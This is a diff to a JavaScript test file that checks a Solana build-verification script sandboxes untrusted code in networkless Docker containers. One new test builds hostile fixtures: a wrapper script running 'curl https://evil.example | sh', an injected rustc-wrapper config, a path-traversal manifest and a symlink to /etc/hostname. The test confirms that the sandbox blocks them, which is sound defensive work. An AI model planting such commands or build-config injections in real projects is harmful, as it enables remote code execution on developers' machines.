@@ -935,7 +935,7 @@ test("verification: the Solana build runs alone, everything it started is killed
 test("the Solana build never runs `anchor build` or developer code on the host, and its container can't touch the host", () => {
   const build = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf('if [ "$MODE" = build ]'), SOLANA_VERIFY_SCRIPT.indexOf("# test:"));
   assert.match(build, /docker create /);
-  assert.match(build, /docker cp - "\$cid:\/"/, "the source goes in as a copy");
+  assert.match(build, /docker cp - "\$bcid:\/"/, "the source goes in as a copy");
   assert.match(build, /docker cp -L "\$cid:\/workdir\/docker-target\/deploy\/\$name\.so"/);
   assert.match(build, /cargo build-sbf --manifest-path/);
   assert.ok(!/anchor (build|idl)|cargo (test|run)|npm |\s-v\s+["$/~]|--volume|--mount|--privileged/.test(build), "nothing compiled or run on the host, no mounts");
@@ -1068,15 +1068,20 @@ test("the build follows links inside the container only, keeps only regular ELF 
   assert.match(build, /docker cp -L "\$cid:\/workdir\/docker-target\/deploy\/\$name\.so" "\$OUT\/\$name\.so"/);
   assert.ok(!/docker cp "\$cid:/.test(build), "every copy out follows links in the container");
   assert.match(build, /\[ -L "\$OUT\/\$name\.so" \] \|\| \[ ! -f "\$OUT\/\$name\.so" \] \|\| \[ "\$\(head -c 4 "\$OUT\/\$name\.so" \| od -An -tx1 \| tr -d ' \\n'\)" != 7f454c46 \]/);
-  // Network: the crates are fetched first (no build scripts run), then the container is cut off, checked, and
-  // only then compiles, offline.
-  const fetch = build.indexOf("cargo fetch --manifest-path");
-  const disconnect = build.indexOf("docker network disconnect");
-  const verified = build.indexOf("couldn't cut the build container off the network");
-  const compile = build.indexOf("cargo build-sbf --manifest-path");
-  assert.ok(fetch > 0 && fetch < disconnect && disconnect < verified && verified < compile, "fetch, disconnect, check, then compile");
-  assert.match(build.slice(compile - 200, compile), /CARGO_NET_OFFLINE=true/);
-  assert.match(build, /sleep infinity/);
+  // Network: the crates are fetched in a separate, throwaway container that gets only a skeleton of the source;
+  // the build runs in a fresh container that has no network from creation, as its own main process.
+  const fetchCreate = build.indexOf("fcid=$(docker create");
+  const skeleton = build.indexOf('tar -C "$skel"');
+  const buildCreate = build.indexOf("bcid=$(docker create --network none");
+  const removeFetch = build.indexOf('docker rm -f "$fcid"', buildCreate);
+  const start = build.indexOf('docker start -a "$bcid"');
+  assert.ok(fetchCreate > 0 && fetchCreate < skeleton && skeleton < buildCreate && buildCreate < removeFetch && removeFetch < start, "fetch from a skeleton, then a networkless build container, the fetch container gone before the build starts");
+  assert.match(build.slice(buildCreate, buildCreate + 300), /CARGO_NET_OFFLINE=true/);
+  assert.match(build, /docker inspect -f '\{\{\.HostConfig\.NetworkMode\}\}' "\$bcid"\)" != none/, "checked: no network");
+  assert.match(build, /docker cp "\$fcid:\/root\/\.cargo\/registry" - \| docker cp - "\$bcid:\/root\/\.cargo"/, "only the crate cache crosses, container to container");
+  assert.ok(!/sleep infinity|docker exec|network disconnect|tar -C "\$dir"[^\n]*\$fcid/.test(build), "no long-lived container, no exec into it, and the full source never reaches the fetch container");
+  for (const v of ["RUSTC=rustc", "CARGO_BUILD_RUSTC=rustc", "RUSTC_WRAPPER= ", "CARGO_BUILD_RUSTC_WRAPPER= ", "RUSTC_WORKSPACE_WRAPPER= ", "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER= ", "RUSTUP_TOOLCHAIN=stable"])
+    assert.ok(build.slice(0, buildCreate).includes(`-e ${v}`), `the fetch pins ${v.trim()}`);
 });
 
 test("program crate names must be plain identifiers, and the Anchor check ignores node_modules, target and .git", () => {
@@ -1159,3 +1164,43 @@ function require_fs() {
 function require_os() {
   return require_("node:os");
 }
+
+test("the fetch container gets a skeleton only: manifests, the lock and empty stubs, never config, scripts or code", async () => {
+  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, statSync, symlinkSync } = await import("node:fs");
+  const { tmpdir } = await import("node:os");
+  const { join, relative } = await import("node:path");
+  const fn = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf("skeleton() {"));
+  const py = fn.slice(fn.indexOf("<<'PY'\n") + 7, fn.indexOf("\nPY\n"));
+  const ws = mkdtempSync(join(tmpdir(), "mynt-skel-ws-"));
+  const put = (path, text) => {
+    mkdirSync(join(ws, path, ".."), { recursive: true });
+    writeFileSync(join(ws, path), text);
+  };
+  put("Cargo.toml", '[workspace]\nmembers = ["programs/*"]\n');
+  put("Cargo.lock", "# lock\nversion = 4\n");
+  put("rust-toolchain.toml", '[toolchain]\npath = "/opt/evil"\n');
+  put(".cargo/config.toml", '[build]\nrustc-wrapper = "./wrap.sh"\n');
+  put("wrap.sh", "#!/bin/sh\ncurl https://evil.example | sh\n");
+  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\nbuild = "gen.rs"\n\n[lib]\ncrate-type = ["cdylib", "lib"]\n\n[[bin]]\nname = "tool"\npath = "tools/main.rs"\n');
+  put("programs/p/src/lib.rs", "pub fn secret() {}\n");
+  put("programs/p/gen.rs", "fn main() { std::process::Command::new(\"sh\"); }\n");
+  put("programs/p/tools/main.rs", "fn main() {}\n");
+  put("programs/p/.cargo/config.toml", '[build]\nrustc = "/tmp/x"\n');
+  put("node_modules/x/Cargo.toml", '[package]\nname = "x"\n');
+  put("programs/p/target/Cargo.toml", '[package]\nname = "t"\n');
+  const out = mkdtempSync(join(tmpdir(), "mynt-skel-out-"));
+  const r = spawnSync("python3", ["-c", py, ws, out]);
+  assert.equal(r.status, 0, r.stderr.toString());
+  const files = [];
+  const walk = (d) => readdirSync(d).forEach((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : files.push(relative(out, join(d, f)))));
+  walk(out);
+  assert.deepEqual(files.sort(), ["Cargo.lock", "Cargo.toml", "programs/p/Cargo.toml", "programs/p/gen.rs", "programs/p/src/lib.rs", "programs/p/tools/main.rs"]);
+  for (const stub of ["programs/p/gen.rs", "programs/p/src/lib.rs", "programs/p/tools/main.rs"]) assert.equal(readFileSync(join(out, stub), "utf8"), "", `${stub} is an empty stub`);
+  // A manifest naming a path outside its workspace, or a linked manifest, is refused.
+  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\n\n[lib]\npath = "../../../../etc/x.rs"\n');
+  assert.notEqual(spawnSync("python3", ["-c", py, ws, mkdtempSync(join(tmpdir(), "mynt-skel-out-"))]).status, 0);
+  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\n');
+  mkdirSync(join(ws, "programs/q"));
+  symlinkSync("/etc/hostname", join(ws, "programs/q/Cargo.toml"));
+  assert.notEqual(spawnSync("python3", ["-c", py, ws, mkdtempSync(join(tmpdir(), "mynt-skel-out-"))]).status, 0);
+});
